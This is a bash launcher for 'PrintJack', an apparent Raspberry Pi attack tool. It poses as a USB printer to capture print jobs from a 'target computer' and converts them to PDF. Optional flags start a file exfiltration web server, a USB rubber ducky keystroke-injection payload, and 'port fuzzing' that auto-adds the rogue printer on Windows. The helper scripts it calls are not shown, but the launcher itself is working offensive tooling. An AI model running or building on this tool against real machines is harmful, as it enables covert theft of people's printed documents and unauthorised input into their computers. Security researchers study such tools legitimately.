#!/bin/bash
# PrintJack Auto-Initiate Script
# Automatically starts the USB gadget, begins capturing, and handles conversions
# Usage: sudo bash printjack.sh [--exfil|-e] [--ducky|-d] [--fuzz|-f]

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CAPTURE_DIR="$SCRIPT_DIR/captured_print_jobs"

# Command line flags
ENABLE_EXFIL=false
ENABLE_DUCKY=false
ENABLE_FUZZ=false

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -e|--exfil)
            ENABLE_EXFIL=true
            shift
            ;;
        -d|--ducky)
            ENABLE_DUCKY=true
            shift
            ;;
        -f|--fuzz)
            ENABLE_FUZZ=true
            shift
            ;;
        -h|--help)
            echo "Usage: sudo bash printjack.sh [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  -e, --exfil    Start file exfiltration server"
            echo "  -d, --ducky    Enable USB rubber ducky functionality" 
            echo "  -f, --fuzz     Enable USB port fuzzing (auto-add printer in Windows)"
            echo "  -h, --help     Show this help message"
            echo ""
            echo "Examples:"
            echo "  sudo bash printjack.sh                    # Print capture only"
            echo "  sudo bash printjack.sh --exfil            # Print capture + file server"
            echo "  sudo bash printjack.sh --ducky            # Print capture + ducky"
            echo "  sudo bash printjack.sh --fuzz             # Print capture + USB port fuzzing"
            echo "  sudo bash printjack.sh --exfil --ducky    # Exfil + ducky (no fuzzing)"
            echo "  sudo bash printjack.sh --exfil --fuzz     # Exfil + fuzzing (no ducky)"
            echo ""
            echo "Note: --ducky and --fuzz are mutually exclusive"
            exit 0
            ;;
        *)
            echo -e "${RED}Unknown option: $1${NC}"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
done

# Check for mutually exclusive options
if [ "$ENABLE_DUCKY" = true ] && [ "$ENABLE_FUZZ" = true ]; then
    echo -e "${RED}Error: --ducky and --fuzz options cannot be used together${NC}"
    echo "Choose either USB rubber ducky OR USB port fuzzing, not both"
    exit 1
fi

echo -e "${RED}"
echo "██████╗ ██████╗ ██╗███╗   ██╗████████╗     ██╗ █████╗  ██████╗██╗  ██╗"
echo "██╔══██╗██╔══██╗██║████╗  ██║╚══██╔══╝     ██║██╔══██╗██╔════╝██║ ██╔╝"
echo "██████╔╝██████╔╝██║██╔██╗ ██║   ██║        ██║███████║██║     █████╔╝ "
echo "██╔═══╝ ██╔══██╗██║██║╚██╗██║   ██║   ██   ██║██╔══██║██║     ██╔═██╗ "
echo "██║     ██║  ██║██║██║ ╚████║   ██║   ╚█████╔╝██║  ██║╚██████╗██║  ██╗"
echo "╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝    ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
echo "                                                                       "
echo "           USB PRINTER CAPTURE & INTERCEPT SYSTEM"
echo "==========================================================================="
echo -e "${NC}"

# Show enabled features
if [ "$ENABLE_EXFIL" = true ] || [ "$ENABLE_DUCKY" = true ] || [ "$ENABLE_FUZZ" = true ]; then
    echo -e "${BLUE}Enabled Features:${NC}"
    [ "$ENABLE_EXFIL" = true ] && echo -e "  • ${GREEN}File Exfiltration Server${NC}"
    [ "$ENABLE_DUCKY" = true ] && echo -e "  • ${GREEN}USB Rubber Ducky${NC}"
    [ "$ENABLE_FUZZ" = true ] && echo -e "  • ${GREEN}USB Port Fuzzing (Auto-Printer Setup)${NC}"
    echo -e "  • ${GREEN}Print Job Capture${NC} (always enabled)"
    echo ""
fi

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Must run as root: sudo bash $0${NC}"
    exit 1
fi

# PIDs for cleanup
CAPTURE_PID=""
CONVERTER_PID=""
EXFIL_PID=""
DUCKY_PID=""
HELP_PID=""

# Function to cleanup on exit
cleanup() {
    echo -e "\n${YELLOW}Cleaning up PrintJack services...${NC}"
    
    # Kill all background processes
    for pid_var in HELP_PID CAPTURE_PID CONVERTER_PID EXFIL_PID DUCKY_PID; do
        eval "PID=\$$pid_var"
        if [ ! -z "$PID" ]; then
            echo "Stopping $(echo $pid_var | sed 's/_PID//' | tr '[:upper:]' '[:lower:]') process..."
            kill $PID 2>/dev/null || true
            wait $PID 2>/dev/null || true
        fi
    done
    
    # Final file count
    if [ -d "$CAPTURE_DIR" ]; then
        XPS_COUNT=$(find "$CAPTURE_DIR" -name "*.xps" 2>/dev/null | wc -l)
        PDF_COUNT=$(find "$CAPTURE_DIR/converted" -name "*.pdf" 2>/dev/null | wc -l)
        echo -e "${GREEN}Final Count: $XPS_COUNT XPS files, $PDF_COUNT PDF files${NC}"
    fi
    
    echo -e "${GREEN}PrintJack services stopped${NC}"
    exit 0
}

# Set up signal handlers
trap cleanup SIGINT SIGTERM

# Step 1: Start USB Gadget
echo -e "${YELLOW}[1/5] Checking PrintJack USB Gadget...${NC}"

GADGET_EXISTS=false
DEVICE_FILE_EXISTS=false

if ls /sys/kernel/config/usb_gadget/ >/dev/null 2>&1 && [ "$(ls /sys/kernel/config/usb_gadget/ 2>/dev/null | wc -l)" -gt 0 ]; then
    GADGET_EXISTS=true
fi

if ls /dev/g_printer* >/dev/null 2>&1; then
    DEVICE_FILE_EXISTS=true
fi

if [ "$GADGET_EXISTS" = true ] && [ "$DEVICE_FILE_EXISTS" = true ]; then
    echo -e "  ${GREEN}✓${NC} USB Gadget active"
else
    if [ -f "$SCRIPT_DIR/start-printjack-gadget.sh" ]; then
        if bash "$SCRIPT_DIR/start-printjack-gadget.sh" >/dev/null 2>&1; then
            echo -e "  ${GREEN}✓${NC} USB Gadget started"
        else
            echo -e "  ${RED}✗${NC} Failed to start USB Gadget - check installation"
            exit 1
        fi
    else
        echo -e "  ${RED}✗${NC} start-printjack-gadget.sh not found"
        exit 1
    fi
fi

# Step 2: Start USB Rubber Ducky or USB Port Fuzzing (if enabled)
if [ "$ENABLE_DUCKY" = true ]; then
    echo -e "${YELLOW}[2/5] Starting USB Rubber Ducky...${NC}"
    if [ -f "$SCRIPT_DIR/printjack_ducky.py" ]; then
        (
            cd "$SCRIPT_DIR"
            python3 printjack_ducky.py >/dev/null 2>&1
        ) &
        DUCKY_PID=$!
        echo -e "  ${GREEN}✓${NC} Ducky payload system active (PID: $DUCKY_PID)"
    else
        echo -e "  ${RED}✗${NC} printjack_ducky.py not found"
    fi
elif [ "$ENABLE_FUZZ" = true ]; then
    echo -e "${YELLOW}[2/5] Starting USB Port Fuzzing...${NC}"
    if [ -f "$SCRIPT_DIR/printjack_ducky_fuzz.py" ]; then
        (
            cd "$SCRIPT_DIR"
            python3 printjack_ducky_fuzz.py >/dev/null 2>&1
        ) &
        DUCKY_PID=$!
        echo -e "  ${GREEN}✓${NC} USB port fuzzing active - Auto-adding printers on ports 1-10 (PID: $DUCKY_PID)"
    else
        echo -e "  ${RED}✗${NC} printjack_ducky_fuzz.py not found"
    fi
else
    echo -e "${YELLOW}[2/5] USB Rubber Ducky/Fuzzing: ${NC}Disabled"
fi

# Step 3: Start File Exfiltration Server (if enabled)  
if [ "$ENABLE_EXFIL" = true ]; then
    echo -e "${YELLOW}[3/5] Starting File Exfiltration Server...${NC}"
    if [ -f "$SCRIPT_DIR/printjack_exfil.py" ]; then
        # Get Pi IP address
        PI_IP=$(hostname -I | awk '{print $1}')
        
        (
            cd "$SCRIPT_DIR"
            python3 printjack_exfil.py >/dev/null 2>&1
        ) &
        EXFIL_PID=$!
        
        # Give it a moment to start and check if it's still running
        sleep 2
        if kill -0 $EXFIL_PID 2>/dev/null; then
            echo -e "  ${GREEN}✓${NC} Exfiltration server running (PID: $EXFIL_PID)"
            echo -e "  ${BLUE}→${NC} Access files at: http://$PI_IP"
        else
            echo -e "  ${RED}✗${NC} Failed to start exfiltration server"
            EXFIL_PID=""
        fi
    else
        echo -e "  ${RED}✗${NC} printjack_exfil.py not found"
    fi
else
    echo -e "${YELLOW}[3/5] File Exfiltration Server: ${NC}Disabled"
fi

# Step 4: Start Background Converter
echo -e "${YELLOW}[4/5] Starting Background Converter...${NC}"
if [ -f "$SCRIPT_DIR/convert_captures.py" ]; then
    CONVERTER_LOG="$SCRIPT_DIR/logs/converter.log"
    mkdir -p "$SCRIPT_DIR/logs"
    
    (
        echo "$(date): Background converter started" >> "$CONVERTER_LOG"
        while true; do
            sleep 20
            
            if [ -d "$CAPTURE_DIR" ]; then
                UNCONVERTED_COUNT=0
                
                while IFS= read -r -d '' xps_file; do
                    if [ -f "$xps_file" ]; then
                        base_name=$(basename "$xps_file" .xps)
                        pdf_file="$CAPTURE_DIR/converted/${base_name}.pdf"
                        
                        if [ ! -f "$pdf_file" ]; then
                            UNCONVERTED_COUNT=$((UNCONVERTED_COUNT + 1))
                        fi
                    fi
                done < <(find "$CAPTURE_DIR" -maxdepth 1 -name "*.xps" -print0 2>/dev/null)
                
                if [ "$UNCONVERTED_COUNT" -gt 0 ]; then
                    cd "$SCRIPT_DIR"
                    python3 convert_captures.py "$CAPTURE_DIR/" >> "$CONVERTER_LOG" 2>&1
                fi
            fi
        done
    ) &
    CONVERTER_PID=$!
    echo -e "  ${GREEN}✓${NC} Background converter active (PID: $CONVERTER_PID)"
else
    echo -e "  ${YELLOW}!${NC} convert_captures.py not found - manual conversion required"
fi

# Step 5: Start Print Job Capture
echo -e "${YELLOW}[5/5] Starting Print Job Capture...${NC}"
echo ""

# Display active services summary
echo -e "${BLUE}PrintJack Active Services:${NC}"
echo -e "  • USB Gadget: ${GREEN}Running${NC}"
[ "$ENABLE_DUCKY" = true ] && echo -e "  • USB Rubber Ducky: ${GREEN}Running${NC} (PID: $DUCKY_PID)"
[ "$ENABLE_FUZZ" = true ] && echo -e "  • USB Port Fuzzing: ${GREEN}Running${NC} (PID: $DUCKY_PID)"
[ "$ENABLE_EXFIL" = true ] && [ ! -z "$EXFIL_PID" ] && echo -e "  • Exfiltration Server: ${GREEN}Running${NC} (PID: $EXFIL_PID)"
echo -e "  • Background Converter: ${GREEN}Running${NC} (PID: $CONVERTER_PID)"
echo -e "  • Print Capture: ${YELLOW}Starting...${NC}"
echo ""

# Show file access info if exfil is enabled
if [ "$ENABLE_EXFIL" = true ] && [ ! -z "$EXFIL_PID" ]; then
    PI_IP=$(hostname -I | awk '{print $1}')
    echo -e "${BLUE}File Access:${NC}"
    echo -e "  • Web Interface: ${GREEN}http://$PI_IP${NC}"
    echo -e "  • Files Location: captured_print_jobs/converted/"
    echo ""
fi

# Show current file count
if [ -d "$CAPTURE_DIR" ]; then
    XPS_COUNT=$(find "$CAPTURE_DIR" -name "*.xps" 2>/dev/null | wc -l)
    PDF_COUNT=$(find "$CAPTURE_DIR/converted" -name "*.pdf" 2>/dev/null | wc -l)
    echo -e "${BLUE}Current Files:${NC} $XPS_COUNT XPS, $PDF_COUNT PDF"
    echo ""
fi

echo -e "${GREEN}PrintJack ready! Start printing from target computer...${NC}"
[ "$ENABLE_FUZZ" = true ] && echo -e "${GREEN}USB port fuzzing will attempt to auto-add printer on Windows${NC}"
echo -e "${YELLOW}Press Ctrl+C to stop all services${NC}"
echo ""

# Start print capture
if [ -f "$SCRIPT_DIR/printjack_capture.py" ]; then
    cd "$SCRIPT_DIR"
    
    # Start minimal status monitor  
    (
        sleep 90  # Wait longer before first update
        while true; do
            if [ -d "$CAPTURE_DIR" ]; then
                XPS_COUNT=$(find "$CAPTURE_DIR" -name "*.xps" 2>/dev/null | wc -l)
                PDF_COUNT=$(find "$CAPTURE_DIR/converted" -name "*.pdf" 2>/dev/null | wc -l)
                echo -e "${BLUE}[$(date '+%H:%M:%S')] Files: $XPS_COUNT XPS → $PDF_COUNT PDF${NC}"
            fi
            sleep 180  # Status every 3 minutes
        done
    ) &
    HELP_PID=$!
    
    # Run capture in foreground
    python3 printjack_capture.py &
    CAPTURE_PID=$!
    
    # Wait for the capture process
    wait $CAPTURE_PID
    
else
    echo -e "  ${RED}✗${NC} printjack_capture.py not found"
    cleanup
    exit 1
fi

# Normal exit cleanup
cleanup